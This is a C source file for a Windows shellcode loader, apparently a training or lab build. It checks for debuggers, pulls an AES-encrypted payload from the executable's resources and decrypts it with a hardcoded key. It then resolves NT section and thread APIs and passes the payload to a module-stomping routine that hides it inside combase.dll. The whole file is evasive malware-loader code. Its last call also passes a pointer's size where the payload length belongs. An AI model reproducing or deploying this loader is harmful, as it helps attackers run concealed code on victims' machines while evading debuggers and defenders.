#include <Windows.h>
#include <stdio.h>

#include "Structs.h"
#include "encryption.h"
#include "resource.h"
#include "antidebug.h"
#include "injector.h"

#pragma warning (disable:4996)

#define SACRIFICAL_DLL	L"C:\\Windows\\System32\\combase.dll"
#define NT_SUCCESS(status)              (((NTSTATUS)(status)) >= 0)


unsigned char AesKey[] = {
		0xD1, 0xF4, 0x8B, 0xB4, 0x9C, 0x2F, 0x48, 0x72, 0xC1, 0xE2, 0x01, 0x0F, 0xD6, 0x21, 0x0D, 0xD2,
		0x13, 0x11, 0x8B, 0xB2, 0xA9, 0xEF, 0x53, 0x75, 0x54, 0x53, 0x2C, 0x15, 0x34, 0xB6, 0x3F, 0x67 };


unsigned char AesIv[] = {
		0x0E, 0xB9, 0x90, 0x36, 0xAE, 0x3A, 0x2E, 0x3A, 0x50, 0x8F, 0xB9, 0x39, 0xB0, 0x9A, 0x5C, 0x45 };


void PrintShellcode(PBYTE pShellcode, SIZE_T size) {
	for (SIZE_T i = 0; i < size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		printf("%02X ", pShellcode[i]);
	}
	printf("\n\n");
}


int main() {
	// Check for debugging environment
	if (IsDebuggerPresent() || NtQIPDebuggerCheck() || HardwareBpCheck())
	{
		// Simulate other behavior or exit...
		printf("[!] Found debugger. \n");
		return -1;
	}
	DWORD	dwBuffer = 0x00;
	HRSRC	hRsrc = NULL;
	HGLOBAL	hGlobal = NULL;
	PVOID	pPayloadAddress = NULL;
	SIZE_T	sPayloadSize = NULL;
	DWORD decryptedPayloadSize = 0;
	PVOID pDecryptedPayload = NULL;
	HMODULE		hNtdll = NULL;
	NTAPIFP		g_NtApi = { 0x00 };

	printf("[i] Press Enter To Retrieve The Payload");
	getchar();
	printf("[i] Trying To Retrieve The Payload From Resources...");

	// Get the location to the data stored in .rsrc by its id *IDR_RCDATA1*
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL)
	{
		// in case of function failure
		printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get HGLOBAL, or the handle of the specified resource data since its reuquired to call LockResource later
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
	{
		// in case of function failure
		printf("[!] LockResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the address of our payload in .rsrc section
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		printf("[!] LockResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the size of our payload in .rsrc section
	sPayloadSize = SizeofResource(NULL, hRsrc);
	if (sPayloadSize == NULL)
	{
		printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());
		return -1;
	}
	// Allocating memory using a HeapAlloc call
	PBYTE pTmpBuffer = HeapAlloc(GetProcessHeap(), 0, sPayloadSize);
	if (pTmpBuffer != NULL) {
		// copying the payload from resource section to the new buffer 
		memcpy(pTmpBuffer, pPayloadAddress, sPayloadSize);
	}

	// Printing the base address of our buffer (pTmpBuffer)
	printf("[i] pTmpBuffer var : 0x%p \n", pTmpBuffer);

	// Print the encrypted payload
	printf("[i] Encrypted Shellcode (Hex Dump):\n");
	PrintShellcode(pTmpBuffer, sPayloadSize);

	// Step 2: Decrypt the payload
	printf("[#] Press <Enter> to decrypt the payload...");
	getchar();
	if (!SimpleDecryption(pTmpBuffer, (DWORD)sPayloadSize, AesKey, AesIv, &pDecryptedPayload, &decryptedPayloadSize)) {
		printf("[!] Failed to decrypt the payload.\n");
		LocalFree(pTmpBuffer);
		return -1;
	}
	printf("[+] Payload decrypted. Size: %lu bytes\n", decryptedPayloadSize);

	// Print the decrypted payload
	printf("[i] Decrypted Shellcode (Hex Dump):\n");
	PrintShellcode((BYTE*)pDecryptedPayload, decryptedPayloadSize);


	if (!(hNtdll = GetModuleHandle(TEXT("NTDLL"))))
		return -1;

	g_NtApi.pNtCreateSection = (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	g_NtApi.pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	g_NtApi.pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

	if (!g_NtApi.pNtCreateSection || !g_NtApi.pNtMapViewOfSection || !g_NtApi.pNtCreateThreadEx)
		return -1;

	if (!ShellcodeModuleStomp(SACRIFICAL_DLL, pDecryptedPayload, sizeof(pDecryptedPayload)))
		return -1;

}